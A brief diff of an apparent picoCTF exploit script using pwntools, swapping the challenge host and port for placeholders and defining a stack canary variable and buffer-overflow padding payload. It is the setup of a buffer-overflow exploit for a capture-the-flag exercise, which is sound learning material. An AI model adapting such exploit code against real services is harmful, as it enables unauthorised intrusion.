@@ -1,7 +1,7 @@
 from pwn import *
 
-host = 'saturn.picoctf.net'
-port = 62183
+host = 'HOST_HERE'
+port = PORT_HERE
 canary = ''
 payload = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' #Used to overflow our buffer
 payload_end = 'BBBBBBBBBBBBBBBB'
